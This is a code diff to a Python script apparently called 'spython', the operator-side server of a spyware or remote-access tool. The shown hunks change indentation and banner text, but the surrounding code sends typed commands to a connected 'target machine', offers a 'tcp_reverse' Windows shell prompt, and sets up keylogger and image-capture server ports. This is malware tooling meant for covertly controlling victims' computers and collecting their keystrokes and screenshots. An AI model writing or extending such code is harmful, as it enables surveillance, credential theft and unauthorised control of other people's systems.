@@ -31,21 +31,21 @@ class Server:
                print(f"[*]Got a connection from {addr[0]}:{addr[1]}")
                tgt_sock.settimeout(3)
                while True:
-               	    try:
+                  try:
                      cmd = input(prompt)
                      if cmd == "tcp_reverse":
-                     	prompt = "windows_shell>"
+                        prompt = "windows_shell>"
                      elif cmd =="exit":
-                     	prompt = ">"
+                        prompt = ">"
                      cmd += "\n"
                      tgt_sock.send(cmd.encode())
                      data = tgt_sock.recv(1024).decode()  	   
                      print(data)
-                    except KeyboardInterrupt:
+                  except KeyboardInterrupt:
                            exit()               
-                    except TimeoutError:
-                    	continue
-                    except ConnectionAbortedError:
+                  except TimeoutError:
+                      continue
+                  except ConnectionAbortedError:
                            print("[-]Connection aborted by target machine")
                            exit()
     
@@ -112,7 +112,7 @@ def main()->None:
     IPATH = input("Path of file to save image: ") or "image.jpeg"
     print(f"[*]Host -> {HOST}")
     print(f"[*]Main port -> {MAIN_PORT}")
-    print(f"[*]Keylogger server port -> {KLOG_PORT}")
+    print(f"[*]Keylogger server port(K_PORT or KPORT or KEY PORT) -> {KLOG_PORT}")
     print(f"[*]Image server port -> {BIN_PORT}")
     
     active_server = Server(HOST,MAIN_PORT)
@@ -130,7 +130,7 @@ def main()->None:
     print("[-]Program ended")
 
 if __name__ == "__main__":
-   spy = r"""
+   logo = r"""
    _____  _____ __     __  _______  _    _   ____   _   _ 
   / ____||  __ \\ \   / / |__   __|| |  | | / __ \ | \ | |
  | (___  | |__) |\ \_//     | |   | |__| || |  | ||  \| |
@@ -140,5 +140,7 @@ if __name__ == "__main__":
                                                           
                                                           
 """
-   print(spy[:141],colored(spy[141:],"red"))
+   msg = "This is the command line interface of spython. Fill in the parametes below to start the sever!"
+   print(logo[:141],colored(logo[141:],"red"))
+   print(colored(msg,"red"))
    main()
